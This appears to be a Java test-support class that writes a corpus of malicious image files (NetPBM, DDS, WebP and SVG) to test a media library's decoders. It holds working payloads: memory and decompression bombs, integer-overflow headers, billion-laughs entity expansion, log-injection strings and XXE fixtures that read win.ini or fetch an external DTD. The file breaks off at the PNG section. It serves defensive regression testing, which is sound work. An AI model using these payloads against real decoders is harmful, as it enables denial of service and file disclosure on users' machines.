package org.watermedia.test.support;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.zip.CRC32;
import java.util.zip.Deflater;

/**
 * Generator for the hostile image corpus under {@code src/test/resources/pentest}.
 *
 * <p>The fixtures are binary attack payloads that cannot be authored by hand or kept readable in a
 * diff, so they are produced here instead: every file is described once, in code, next to the
 * vulnerability class and the real-world CVE it mirrors. Run {@code main} to (re)write the corpus;
 * the emitted files are committed and {@link org.watermedia.test.codecs.Pentesting} reads them from
 * disk, so the suite never depends on this class at test time.
 *
 * <p>Payloads stay small on purpose. Every bomb here expresses its cost through <em>header fields</em>
 * (declared dimensions, declared frame counts, declared expansion ratios) rather than through bulk,
 * which is precisely what makes the vulnerability class dangerous: a few dozen bytes off the network
 * turn into gigabytes of allocation on the client.
 */
public final class MaliciousImages {

    public static final Path ROOT = Path.of("src", "test", "resources", "pentest");

    private MaliciousImages() {}

    public static void main(final String[] args) throws IOException {
        gif(ROOT.resolve("gif"));
        png(ROOT.resolve("png"));
        jpeg(ROOT.resolve("jpeg"));
        netpbm(ROOT.resolve("netpbm"));
        dds(ROOT.resolve("dds"));
        webp(ROOT.resolve("webp"));
        svg(ROOT.resolve("svg"));
        System.out.println("Corpus written to " + ROOT.toAbsolutePath());
    }

    // ==========================================================================
    // NETPBM
    // ==========================================================================
    private static void netpbm(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // ONLY P4..P7 ARE DISPATCHED BY CodecsAPI, SO THE ASCII VARIANTS P1..P3 ARE OUT OF REACH
        // AND DELIBERATELY NOT MODELLED HERE.

        // DIRECT-MEMORY BOMB — 15 ASCII BYTES. THE PER-AXIS CAP PASSES AT EXACTLY 16384 AND THE
        // VERY NEXT STATEMENT IS allocateDirect(w * h * 4) = 1 GiB, IN THE CONSTRUCTOR, BEFORE ONE
        // RASTER BYTE IS READ. WEBPReader ALREADY CARRIES THE MISSING SECOND GATE AND SAYS SO IN A
        // COMMENT; NETPBM NEVER GOT IT. THE TRAILING NEWLINE IS LOAD-BEARING: WITHOUT IT THE TOKEN
        // NEVER TERMINATES AND THE HEADER PARSER FAILS BEFORE THE ALLOCATION.
        write(dir, "direct-memory-bomb.pam", ascii("P4\n16384 16384\n"));

        // PAM DEPTH BOMB — DEPTH IS ATTACKER-CONTROLLED, VALIDATED ONLY AS 1..65535, AND MAX_DIM
        // DOES NOT COVER IT. rowBytes = width * depth * bytesPerSample = 16384*65535*2 ≈ 2 GiB IS
        // ALLOCATED BEFORE readFully EVER CHECKS THAT THE PAYLOAD EXISTS. HEIGHT STAYS 1 SO NO
        // SIZE HEURISTIC IS TRIPPED. CVE-2017-2581's RASTER-SIZE ARITHMETIC, MINUS THE OVERFLOW
        // (WHICH IS AVOIDED ONLY BY AN ACCIDENT OF 32767 BYTES OF HEADROOM).
        write(dir, "pam-depth-bomb.pam", ascii(
                "P7\nWIDTH 16384\nHEIGHT 1\nDEPTH 65535\nMAXVAL 65535\nTUPLTYPE RGB\nENDHDR\n"));

        // TRUNCATED HEADERS AND RASTER — THREE RAW java.io.EOFException SITES
        write(dir, "truncated-header.pam", ascii("P5"));
        write(dir, "truncated-pam-header.pam", ascii("P7"));
        write(dir, "truncated-raster.pam", ascii("P5\n1 1 255\n"));

        // UNBOUNDED TUPLTYPE — readRestOfLine HAS NO CEILING AND REPEATED TAGS CONCATENATE, THEN
        // THE WHOLE VALUE IS INTERPOLATED INTO AN EXCEPTION MESSAGE THAT THE PLAYER LOGS VERBATIM.
        // THAT MAKES IT A LOG-INJECTION AND LOG-FLOODING PRIMITIVE AGAINST THE USER'S DISK, WITH
        // ~5x HEAP AMPLIFICATION ON THE WAY. THE CARRIAGE RETURN AND FORGED LOG PREFIX ARE THE
        // POINT: THEY LET AN IMAGE WRITE FABRICATED LINES INTO latest.log.
        write(dir, "tupltype-log-injection.pam", ascii(
                "P7\nWIDTH 1\nHEIGHT 1\nDEPTH 1\nMAXVAL 1\nTUPLTYPE "
                        + "\rX [12:00:00] [Render thread/INFO]: forged log line ".repeat(1200)
                        + "\nENDHDR\n"));

        // P7 HEADER THAT NEVER SAYS ENDHDR — THE WHOLE BODY IS BUFFERED INTO A GROWING
        // ByteArrayOutputStream LOOKING FOR A TERMINATOR THAT DOES NOT EXIST, THEN DISCARDED.
        // THE CODE COMMENT ASSERTS "THE HEADER IS A FEW TOKENS OF ASCII TEXT, SO BUFFERING IT IS
        // CHEAP" — NOTHING ENFORCES THAT ASSUMPTION.
        write(dir, "unbounded-header.pam", ascii("P7\n#" + "Z".repeat(40000) + "\n"));

        // COMMENT/TOKEN MERGE — THE NEWLINE THAT ENDS A COMMENT IS CONSUMED INSIDE THE COMMENT
        // BRANCH AND NEVER REACHES THE WHITESPACE CHECK, SO "1#x\n6384" ACCUMULATES INTO THE SINGLE
        // TOKEN "16384". EVERY REFERENCE DECODER READS THIS FILE AS 1x6384; WATERMEDIA READS IT AS
        // 16384x100. A TEXTBOOK VALIDATOR-BYPASS DIFFERENTIAL: AN UPSTREAM SIZE CHECK ON THE REAL
        // DIMENSIONS PASSES WHILE THE DECODER ALLOCATES FROM THE FORGED ONES.
        write(dir, "comment-token-merge.pam", ascii("P5\n1#x\n6384 100 255\n"));

        // WHITESPACE-SET DESYNC — THE HEADER PRE-SCANNER HARDCODES SPACE/TAB/LF/CR WHILE THE TOKEN
        // PARSER USES Character.isWhitespace, WHICH ALSO ACCEPTS VERTICAL TAB. THE TWO DISAGREE ON
        // WHERE THE HEADER ENDS, AND rasterStart DEPENDS ON THEM AGREEING.
        write(dir, "whitespace-desync.pam", new Buf()
                .ascii("P5").u8(0x0B).ascii("2").u8(0x0B).ascii("2").u8(0x0B).ascii("255").u8(0x0A)
                .raw(0x10, 0x11, 0x12, 0x13).u8(0x0A)
                .bytes());
    }

    // ==========================================================================
    // DDS / BC
    // ==========================================================================
    // THE BC PATH IS DORMANT: BCCodec.init() HARDCODES EVERY VERSION TO FALSE, SO BCReader THROWS
    // BEFORE ITS ARITHMETIC RUNS. THESE FIXTURES ARM THEMSELVES THE DAY THE JNI BINDINGS LAND, AND
    // THE OVERFLOW THEY TARGET IS ALREADY OBSERVABLE TODAY THROUGH THE PUBLIC DDSHeader HELPERS.
    private static void dds(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // BLOCK-COUNT OVERFLOW TO A NEGATIVE — DDS IS THE ONE READER WITH NO DIMENSION CAP AT ALL.
        // AT 65536x65536 WITH BC1, ((w+3)>>2) * ((h+3)>>2) * 8 IS EXACTLY 2^31 AND WRAPS NEGATIVE,
        // SO THE TRUNCATION GUARD AND THE INT-RANGE GUARD BOTH PASS AND allocateDirect RECEIVES A
        // NEGATIVE CAPACITY. THE TWO GUARDS ARE ALSO ORDERED BACKWARDS. OpenImageIO CVE-2026-7582
        // AND PILLOW CVE-2025-48379 ARE THE SAME "BLOCK COUNT TRUSTED FROM THE HEADER" CLASS.
        write(dir, "blockcount-overflow-negative.dds", ddsFile(65536, 65536, 71, 1, 1));

        // THE SAME ARITHMETIC LANDING ON ZERO INSTEAD: 65535x65535 WITH BC7 GIVES 16384*16384*16
        // = 2^32 -> 0. EVERY GUARD PASSES, allocateDirect(0) SUCCEEDS, AND THE READER REPORTS A
        // 65535x65535 TEXTURE BACKED BY ZERO BYTES OF BLOCK DATA — A SELF-EVIDENTLY IMPOSSIBLE
        // PAIR THAT A FUTURE BCn UPLOAD PATH WOULD HAND STRAIGHT TO THE GPU.
        write(dir, "blockcount-overflow-zero.dds", ddsFile(65535, 65535, 98, 1, 1));

        // ARRAY-SIZE AMPLIFICATION — WITH frameBytes AT ZERO, EACH DECLARED FRAME COSTS 8 FOOTER
        // BYTES BUT BUYS TWO DirectByteBuffer OBJECTS. ~16x HEAP AMPLIFICATION, UNCAPPED.
        write(dir, "arraysize-amplification.dds", ddsFile(65535, 65535, 98, 10000, 10000));

        // STRUCTURAL FIELDS NOBODY VALIDATES — dwSize=0, 15 MIP LEVELS, TEXTURE3D AND THE CUBEMAP
        // MISC FLAG ARE ALL ACCEPTED SILENTLY. A CUBE MAP STORES SIX FACES PER SLICE, SO THE FRAME
        // SLICING WOULD BE OFF BY 6x AND GARBAGE BLOCKS WOULD REACH THE GPU AS VALID BCn.
        write(dir, "unvalidated-structure.dds", ddsStructural());
    }

    // DDS + DX10 HEADER FOLLOWED BY THE WMTC FRAME FOOTER. ONLY THE MAGIC, THE DX10 FOURCC, THE
    // DXGI FORMAT, THE DIMENSIONS AND arraySize ARE VALIDATED TODAY — EVERYTHING ELSE IS FREE.
    private static byte[] ddsFile(final int width, final int height, final int dxgiFormat,
                                  final int arraySize, final int frameCount) {
        final Buf b = ddsHeader(width, height, dxgiFormat, arraySize, 1, 3, 0, 124);
        b.ascii("WMTC").le32(1).le32(frameCount);
        for (int i = 0; i < frameCount; i++) b.fill(0x00, 8);
        return b.bytes();
    }

    private static byte[] ddsStructural() {
        // 64x64 BC7 -> frameBytes = 16*16*16 = 4096, SO THE PAYLOAD MUST REALLY BE THERE
        final Buf b = ddsHeader(64, 64, 98, 1, 15, 4, 4, 0);
        b.fill(0x00, 4096);
        b.ascii("WMTC").le32(1).le32(1).fill(0x00, 8);
        return b.bytes();
    }

    private static Buf ddsHeader(final int width, final int height, final int dxgiFormat,
                                 final int arraySize, final int mipMapCount,
                                 final int resourceDimension, final int miscFlag, final int headerSize) {
        return new Buf()
                .ascii("DDS ").le32(headerSize).le32(0x00081007)
                .le32(height).le32(width)
                .le32(0).le32(0).le32(mipMapCount)
                .fill(0x00, 44)                     // dwReserved1[11]
                .le32(32).le32(4).ascii("DX10")     // ddspf: size, DDPF_FOURCC, DX10
                .fill(0x00, 20)                     // bit count + four masks
                .le32(0x1000)                       // dwCaps: DDSCAPS_TEXTURE
                .fill(0x00, 16)                     // dwCaps2/3/4 + reserved2
                .le32(dxgiFormat).le32(resourceDimension).le32(miscFlag).le32(arraySize).le32(0);
    }

    private static byte[] ascii(final String s) {
        return s.getBytes(StandardCharsets.US_ASCII);
    }

    // ==========================================================================
    // WEBP
    // ==========================================================================
    private static void webp(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // XMP QUADRATIC BOMB — xmlTexts ADVANCES ITS CURSOR BY 9 CHARACTERS PER ITERATION, ANCHORED
        // ON THE FIRST </rdf:li> AT OR AFTER pos, WHILE extractXmlContent RE-SCANS FROM pos FOR THE
        // NEXT REAL ELEMENT. A LONG RUN OF BARE TERMINATORS FOLLOWED BY ONE REAL ELEMENT THEREFORE
        // RE-EXTRACTS AND RETAINS THE SAME BODY N TIMES: O(L^2/36) BYTES HELD LIVE FROM AN L-BYTE
        // CHUNK, ALL INSIDE THE CONSTRUCTOR. CWE-1333 / REPEATED-TAG RESCAN FAMILY.
        final int terminators = 2000;
        final int bodyLength = 20000;
        // THE TRAILING VP8L IS LOAD-BEARING: WITHOUT A BITSTREAM CHUNK THE READER ABORTS RIGHT AFTER
        // THE XMP PARSE, AND THAT CLEAN REJECTION WOULD MASK THE BLOWUP THAT ALREADY HAPPENED.
        write(dir, "xmp-quadratic-bomb.webp", riff(webpChunk("VP8X", vp8xBody(0x00, 1, 1)),
                webpChunk("XMP ", ascii("<dc:title>" + "</rdf:li>".repeat(terminators)
                        + "<rdf:li>" + "Z".repeat(bodyLength) + "</rdf:li></dc:title>")),
                webpChunk("VP8L", new Buf().u8(0x2F).le32(0)
                        .raw(vp8lSingleSymbolGroups(0, 1)).bytes())));

        // CANVAS AT EXACTLY THE CAP — THE GATE IS "> MAX_PIXELS", SO 8192x8192 == 1<<26 PASSES, AND
        // AN ANIMATED VP8X THEN COMMITS int[67108864] (256 MB) PLUS allocateDirect (256 MB) IN THE
        // CONSTRUCTOR BEFORE ANY FRAME EXISTS. THE READER RETURNS SUCCESSFULLY, hasNext() IS FALSE,
        // AND HALF A GIGABYTE IS GONE WITH NO EXCEPTION AND NO LOG LINE. THE EXISTING REGRESSION
        // TEST ONLY COVERS 16384x16384, WHICH IS ABOVE THE CAP; THE AT-CAP CASE WAS NEVER TESTED.
        write(dir, "canvas-at-cap-bomb.webp", riff(webpChunk("VP8X", vp8xBody(0x02, 8192, 8192))));

        // VP8L ZERO-BIT PIXEL FILL — RFC 9649 LETS A ONE-SYMBOL PREFIX CODE COST ZERO BITS, AND THE
        // TABLE READER HONOURS THAT. BUT NOTHING TIES THE DECLARED PIXEL COUNT TO THE BITS THE
        // STREAM CAN SUPPLY, SO ALL FIVE TABLES AS ONE-SYMBOL CODES (20 BITS TOTAL) PRODUCE 67
        // MILLION PIXELS FROM NO INPUT AT ALL. THE DECODER GOT A feasibleGroups GATE FOR HUFFMAN
        // GROUPS; THE IDENTICAL REASONING WAS NEVER APPLIED TO PIXELS. libwebp STOPS AT eos_.
        write(dir, "vp8l-zero-bit-fill.webp", riff(webpChunk("VP8L", new Buf()
                .u8(0x2F)                       // VP8L SIGNATURE
                .le32(0x07FFDFFF)               // 14b width-1 = 8191, 14b height-1 = 8191, alpha 0, version 0
                .raw(vp8lSingleSymbolGroups(0, 1))
                .bytes())));

        // VP8 BOOL DECODER RUNS PAST ITS PARTITION IN SILENCE — THE RENORMALISATION REFILL IS
        // GUARDED BY hasRemaining() BUT HAS NO EOF FLAG, SO AN EXHAUSTED PARTITION KEEPS DECODING
        // FROM IMPLICIT ZERO BYTES. A 2-BYTE TOKEN PARTITION THEREFORE "DECODES" A 64-MEGAPIXEL
        // IMAGE: ~608 MB OF PLANES AND BGRA BUFFERS FROM A 52-BYTE FILE, AND IT SUCCEEDS.
        // CVE-2018-25009/25010/25012/25014 ARE THIS EXACT OMISSION IN libwebp.
        write(dir, "vp8-booldecoder-eof.webp", riff(
                webpChunk("VP8X", vp8xBody(0x10, 8192, 8192)),   // ALPHA FLAG FORCES THE BGRA PATH
                webpChunk("VP8 ", new Buf()
                        .raw(0x40, 0x00, 0x00)      // FRAME TAG: KEY FRAME, PARTITION-0 SIZE 2
                        .raw(0x9D, 0x01, 0x2A)      // VP8 START CODE
                        .le16(0x2000).le16(0x2000)  // 8192 x 8192
                        .fill(0x00, 2)              // PARTITION 0
                        .fill(0x00, 2)              // TOKEN PARTITION
                        .bytes())));

        // HUFFMAN GROUP TABLE BOMB — THE GROUP COUNT IS CAPPED ONLY BY A LOGGER.warn. A MINIMAL
        // 20-BIT GROUP COSTS ~3.3 KB OF LIVE TABLES, SO THE BITSTREAM-TO-HEAP AMPLIFICATION IS
        // ~1330x. THE ENTROPY IMAGE ENCODES THE GROUP COUNT AS green | (red << 8): 0xFF AND 0x0F
        // REQUEST 4096 GROUPS (~13 MB) FROM ~10 KB, WHICH DEMONSTRATES THE RATIO WITHOUT KILLING CI.
        write(dir, "vp8l-huffman-group-bomb.webp", riff(webpChunk("VP8L", new Buf()
                .u8(0x2F)
                .le32(0)                            // 1x1 IMAGE: ALL THE COST IS IN THE GROUP TABLES
                .raw(vp8lGroupBomb(0xFF, 0x0F))
                .bytes())));

        // SIX RAW java.io.EOFException SITES, ONE FIXTURE EACH
        write(dir, "truncated-preamble.webp", new Buf().ascii("RIFF").le32(4).ascii("WEBP").bytes());
        write(dir, "trailing-partial-chunk.webp", new Buf()
                .raw(riff(webpChunk("VP8X", vp8xBody(0x00, 1, 1))))
                .ascii("AAAA").bytes());
        write(dir, "chunk-size-past-eof.webp", new Buf()
                .ascii("RIFF").le32(21).ascii("WEBP")
                .ascii("VP8L").le32(65535).u8(0x2F).le32(0)
                .bytes());
        write(dir, "anmf-size-past-eof.webp", new Buf()
                .ascii("RIFF").le32(46).ascii("WEBP")
                .raw(webpChunk("VP8X", vp8xBody(0x02, 16, 16)))
                .raw(webpChunk("ANIM", new byte[6]))
                .ascii("ANMF").le32(65535).fill(0x00, 4)
                .bytes());
        // AN UNKNOWN FOURCC WITH A NEGATIVE SIZE: paddedSize(-8) == -8, SO THE SKIP GOES BACKWARDS.
        // THE EXISTING TEST COVERS NEGATIVE SIZES INSIDE ANMF, NOT AT THE TOP LEVEL.
        write(dir, "negative-chunk-size.webp", new Buf()
                .ascii("RIFF").le32(30).ascii("WEBP")
                .raw(webpChunk("VP8X", vp8xBody(0x00, 1, 1)))
                .ascii("JUNK").le32(-8)
                .bytes());
    }

    // FIVE ONE-SYMBOL PREFIX CODES (GREEN, RED, BLUE, ALPHA, DISTANCE) PRECEDED BY THE THREE
    // STREAM FLAGS. EACH TABLE IS isSimple=1, numSymbols-1=0, is8Bits=0, symbol=0 -> FOUR BITS.
    private static byte[] vp8lSingleSymbolGroups(final int transforms, final int groups) {
        final Bits bits = new Bits();
        bits.put(transforms, 1).put(0, 1).put(0, 1); // NO TRANSFORM, NO COLOR CACHE, NO META HUFFMAN
        for (int g = 0; g < groups; g++) {
            for (int table = 0; table < 5; table++) bits.put(1, 1).put(0, 1).put(0, 1).put(0, 1);
        }
        return bits.bytes();
    }

    // META-HUFFMAN STREAM WHOSE 1x1 ENTROPY IMAGE ENCODES THE GROUP COUNT IN ITS RED AND GREEN
    // CHANNELS, FOLLOWED BY THAT MANY MINIMAL FIVE-TABLE GROUPS.
    private static byte[] vp8lGroupBomb(final int green, final int red) {
        final Bits bits = new Bits();
        bits.put(0, 1).put(0, 1).put(1, 1).put(0, 3); // NO TRANSFORM, NO CACHE, META HUFFMAN, metaBits 2
        bits.put(0, 1);                               // ENTROPY IMAGE: NO SUB COLOR CACHE
        bits.put(1, 1).put(0, 1).put(1, 1).put(green, 8); // GREEN: SIMPLE, 1 SYMBOL, 8-BIT
        bits.put(1, 1).put(0, 1).put(1, 1).put(red, 8);   // RED:   SIMPLE, 1 SYMBOL, 8-BIT
        for (int table = 0; table < 3; table++) bits.put(1, 1).put(0, 1).put(0, 1).put(0, 1);
        final int groups = (green | (red << 8)) + 1;
        for (int g = 0; g < groups; g++) {
            for (int table = 0; table < 5; table++) bits.put(1, 1).put(0, 1).put(0, 1).put(0, 1);
        }
        return bits.fill(0x00, 64).bytes(); // SLACK SO THE FEASIBILITY GATE SEES ENOUGH BITS
    }

    private static byte[] riff(final byte[]... chunks) {
        final Buf body = new Buf().ascii("WEBP");
        for (final byte[] chunk: chunks) body.raw(chunk);
        return new Buf().ascii("RIFF").le32(body.size()).raw(body.bytes()).bytes();
    }

    private static byte[] webpChunk(final String fourCC, final byte[] payload) {
        final Buf out = new Buf().ascii(fourCC).le32(payload.length).raw(payload);
        if ((payload.length & 1) == 1) out.u8(0); // RIFF CHUNKS ARE EVEN-PADDED
        return out.bytes();
    }

    private static byte[] vp8xBody(final int flags, final int width, final int height) {
        return new Buf().u8(flags).fill(0x00, 3).le24(width - 1).le24(height - 1).bytes();
    }

    // ==========================================================================
    // SVG
    // ==========================================================================
    // SVG IS THE ONLY FORMAT HERE THAT IS A DOCUMENT LANGUAGE RATHER THAN A BITSTREAM, SO ITS
    // PAYLOADS ARE TEXT. THE AMPLIFICATION COMES FROM XML ENTITY EXPANSION AND FROM DEGENERATE
    // FLOATING-POINT GEOMETRY, NOT FROM DECLARED SIZES. THE COUNTS BELOW ARE DELIBERATELY SCALED
    // WELL UNDER THE MEASURED WORST CASE: EACH ONE STILL SITS FAR ABOVE ANY SANE LIMIT, SO IT
    // PROVES THE VULNERABILITY WITHOUT PUTTING A GIGABYTE THROUGH CI.
    private static void svg(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // ENTITY MARKUP BOMB — SUPPORT_DTD IS TRUE, SO THE INTERNAL SUBSET STILL EXPANDS GENERAL
        // ENTITIES AND THE PARSER MATERIALISES ONE RETAINED SVGNode PER EXPANDED ELEMENT. THE JDK'S
        // OWN entityReplacementLimit ONLY TRIPS AFTER 3,000,000 NODES ARE ALREADY LIVE ON JDK 17/21
        // (AND IS 25x TIGHTER ON 25), SO IT IS NOT A DEFENCE — THE DECODER NEEDS ITS OWN BUDGET.
        // librsvg CVE-2019-20446 / THE BILLION-LAUGHS FAMILY.
        // THE INTERNAL SUBSET MUST STAY UNDER THE 4096-BYTE SVG SNIFF WINDOW OR CodecsAPI NEVER
        // RECOGNISES THE FILE AS SVG AT ALL. THAT IS AN ACCIDENTAL MITIGATION, NOT A DEFENCE:
        // EXPANSION IS MULTIPLICATIVE, SO A 2 KB SUBSET STILL BUYS HUNDREDS OF THOUSANDS OF NODES.
        write(dir, "entity-markup-bomb.svg", ascii(
                "<?xml version=\"1.0\"?><!DOCTYPE svg [\n"
                        + entity("e0", "<g a='012345'/>".repeat(100))
                        + entity("e1", "&e0;".repeat(100))
                        + entity("e2", "&e1;".repeat(30))
                        + "]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\">&e2;</svg>"));

        // ATTRIBUTE ENTITY PATH BOMB — ENTITIES EXPAND INSIDE ATTRIBUTE VALUES TOO, AND
        // maxGeneralEntitySizeLimit DEFAULTS TO UNLIMITED ON JDK 17/21, SO A SINGLE d="" CAN REACH
        // TENS OF MILLIONS OF CHARACTERS WITH NO JDK EXCEPTION AT ALL. NOTHING DOWNSTREAM BOUNDS
        // THE SEGMENT COUNT, AND THE PATH IS COPIED THREE TIMES ON ITS WAY TO THE EDGE TABLE.
        write(dir, "attribute-entity-path-bomb.svg", ascii(
                "<?xml version='1.0'?><!DOCTYPE svg [\n"
                        + entity("d0", "l1 1".repeat(500))
                        + entity("d1", "&d0;".repeat(100))
                        + entity("d2", "&d1;".repeat(10))
                        + "]><svg xmlns='http://www.w3.org/2000/svg' width='512' height='512'"
                        + " viewBox='0 0 512 512'><path d=\"M0 0&d2;\"/></svg>"));

        // STROKE DISC FLATTEN BOMB — THE MOST EFFICIENT PAYLOAD IN THE WHOLE CODEC. THE LENGTH
        // SCANNER ACCEPTS AN EXPONENT, SO "1e999" BECOMES Infinity; halfWidth IS ONLY GUARDED
        // AGAINST <= 0, SO EVERY SHARP JOIN APPENDS A DISC OF INFINITE RADIUS. THE FLATTENING
        // TOLERANCE TEST IS distSq <= tolSq, WHICH IS FALSE FOR NaN, SO EVERY CUBIC SUBDIVIDES TO
        // THE FULL DEPTH: 1,048,577 POINTS AND ~16.8 MB RETAINED PER VERTEX. cairo CVE-2019-6461.
        final StringBuilder zigzag = new StringBuilder();
        for (int i = 0; i < 8; i++) zigzag.append(i == 0 ? "" : " ").append(i % 2).append(',').append(i);
        write(dir, "stroke-disc-flatten-bomb.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\" viewBox=\"0 0 512 512\">"
                        + "<polyline fill=\"none\" stroke=\"#000\" stroke-width=\"1e999\" points=\""
                        + zigzag + "\"/></svg>"));

        // SCANLINE CROSSING QUADRATIC — crossings() REBUILDS ITS SORTED ACTIVE-EDGE LIST FROM
        // SCRATCH WITH AN INSERTION SORT ON EVERY SUB-SCANLINE, SO COST IS THETA(edges^2) PER ROW.
        // THE X VALUES MUST BE STRICTLY DESCENDING: EQUAL KEYS MAKE THE INSERTION O(1) AND DEFUSE
        // IT, WHICH IS ALSO WHY THIS ONE CANNOT BE ENTITY-AMPLIFIED. cairo CVE-2019-6462.
        final StringBuilder edges = new StringBuilder();
        final int edgeCount = 2000;
        for (int i = 0; i < edgeCount; i++) {
            edges.append("M").append(511 - i * 511.0 / edgeCount).append(" 0h0.01v511h-0.01z");
        }
        write(dir, "scanline-quadratic.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\" viewBox=\"0 0 512 512\">"
                        + "<path d=\"" + edges + "\"/></svg>"));

        // NaN SPAN INDEX — addSpan CLAMPS WITH xa < xlo / xb > xhi / xa >= xb, AND EVERY ONE OF
        // THOSE COMPARISONS IS FALSE WHEN xb IS NaN, SO A LARGE FINITE xa PASSES THROUGH UNCLAMPED
        // AND INDEXES THE COVERAGE ARRAY ANYWHERE. THE NaN COMES FROM 0 * Infinity ON THE EXACT
        // SUB-SCANLINE WHERE ys == eyTop. SUBPATH 1 GENERATES THE NaN; SUBPATH 2 IS A TRIANGLE AT
        // x ~ 1e9 PLACED SO THAT EXACTLY ONE OF ITS EDGES IS ADMITTED FIRST, CREATING THE FATAL
        // (hugeFinite, NaN) ADJACENCY WITH NON-ZERO WINDING.
        write(dir, "nan-span-oob.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\" viewBox=\"0 0 512 512\">"
                        + "<path d=\"M0,0.125L1e999,8Z M1000000000,0L1000000100,20L1000000050,0.125Z\"/></svg>"));

        // GRADIENT STOP LINEAR SCAN — THE STOP LOOKUP IS A LINEAR WALK EXECUTED PER COVERED PIXEL,
        // AND THE STOP COUNT IS UNCAPPED. STOPS NEED NO UNIQUE id, SO THEY AMPLIFY PERFECTLY
        // THROUGH ENTITY EXPANSION: A FEW KB BUY TENS OF THOUSANDS OF STOPS AND SECONDS PER FILL.
        write(dir, "gradient-stop-scan.svg", ascii(
                "<?xml version='1.0'?><!DOCTYPE svg [\n"
                        + entity("s0", "<stop stop-color='#123456'/>".repeat(60))
                        + entity("s1", "&s0;".repeat(100))
                        + entity("s2", "&s1;".repeat(5))
                        + "]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\""
                        + " viewBox=\"0 0 512 512\"><defs><linearGradient id=\"g\">&s2;</linearGradient></defs>"
                        + "<rect width=\"512\" height=\"512\" fill=\"url(#g)\"/></svg>"));

        // GRADIENT href CHAIN — THE CYCLE GUARD IS AIRTIGHT BUT BOUNDS ONLY LOOPS, NOT LENGTH. THE
        // CHAIN IS RE-WALKED ONCE PER GRADIENT AND AGAIN FOR EACH ATTRIBUTE LOOKUP, SO M LINKS COST
        // THETA(M^2), ENTIRELY INSIDE THE CONSTRUCTOR. EACH LINK NEEDS A DISTINCT id, SO THIS ONE
        // CANNOT BE ENTITY-AMPLIFIED — THE FILE IS GENUINELY ~46 BYTES PER LINK.
        final StringBuilder chain = new StringBuilder(
                "<linearGradient id=\"g0\"><stop stop-color=\"#fff\"/></linearGradient>");
        for (int i = 1; i < 2000; i++) {
            chain.append("<linearGradient id=\"g").append(i).append("\" xlink:href=\"#g").append(i - 1).append("\"/>");
        }
        write(dir, "gradient-href-chain.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\""
                        + " width=\"16\" height=\"16\"><defs>" + chain + "</defs></svg>"));

        // COLOUR PAREN ORDER — THE GUARD CHECKS ONLY THAT BOTH PARENTHESES EXIST, NEVER THAT THE
        // CLOSER FOLLOWS THE OPENER, SO substring(begin, end) IS CALLED WITH begin > end. ONLY
        // NumberFormatException IS CAUGHT, SO IT ESCAPES. THE stop-color VARIANT CRASHES IN THE
        // CONSTRUCTOR RATHER THAN IN next().
        write(dir, "color-paren-order-fill.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"8\" height=\"8\">"
                        + "<rect width=\"8\" height=\"8\" fill=\"rgb)(\"/></svg>"));
        write(dir, "color-paren-order-stop.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"8\" height=\"8\"><defs>"
                        + "<linearGradient id=\"g\"><stop stop-color=\"rgb)(\"/></linearGradient></defs>"
                        + "<rect width=\"8\" height=\"8\" fill=\"url(#g)\"/></svg>"));

        // MALFORMED MARKUP — EVERY XMLStreamException, INCLUDING EVERY JDK ENTITY-LIMIT TRIP, IS
        // FUNNELLED INTO A BARE java.io.IOException OUTSIDE THE SEALED HIERARCHY. THIS IS THE
        // TERMINAL OBSERVABLE OF BOTH ENTITY BOMBS ABOVE, WHICH IS WHAT MAKES IT THE MOST REACHABLE
        // CONTRACT VIOLATION IN THE DECODER.
        write(dir, "undefined-entity.svg", ascii(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"8\" height=\"8\">&nope;</svg>"));

        // XXE NEGATIVE REGRESSIONS — THESE MUST STAY INERT. THE DECODER IS CURRENTLY IMMUNE
        // (EXTERNAL ENTITIES DISABLED, RESOLVER RETURNS AN EMPTY STREAM, AND NO href IS EVER
        // DEREFERENCED), AND THESE FIXTURES EXIST SO THAT ANY REGRESSION IN THAT POSTURE FAILS
        // LOUDLY. Batik CVE-2022-44729 / CVE-2022-38398, ImageMagick CVE-2016-3714.
        write(dir, "xxe-file-read.svg", ascii(
                "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]>"
                        + "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"8\" height=\"8\">"
                        + "<title>&xxe;</title><rect width=\"8\" height=\"8\" fill=\"#000\"/></svg>"));
        write(dir, "xxe-external-dtd.svg", ascii(
                "<?xml version=\"1.0\"?><!DOCTYPE svg SYSTEM \"http://127.0.0.1:1/evil.dtd\">"
                        + "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"8\" height=\"8\">"
                        + "<rect width=\"8\" height=\"8\" fill=\"#000\"/></svg>"));
    }

    private static String entity(final String name, final String body) {
        return "<!ENTITY " + name + " \"" + body + "\">\n";
    }

    /** LSB-first bit writer: VP8L packs every field low-bit-first within each byte. */
    static final class Bits {
        private final Buf out = new Buf();
        private int acc;
        private int n;

        Bits put(final int value, final int count) {
            for (int i = 0; i < count; i++) {
                this.acc |= ((value >> i) & 1) << this.n;
                if (++this.n == 8) { this.out.u8(this.acc); this.acc = 0; this.n = 0; }
            }
            return this;
        }

        Bits fill(final int value, final int count) {
            for (int i = 0; i < count; i++) this.put(value, 8);
            return this;
        }

        byte[] bytes() {
            if (this.n > 0) { this.out.u8(this.acc); this.acc = 0; this.n = 0; }
            return this.out.bytes();
        }
    }

    // ==========================================================================
    // PNG / APNG
    // ==========================================================================
    private static void png(final Path dir) throws IOException {
        Files.createDirectories(dir);

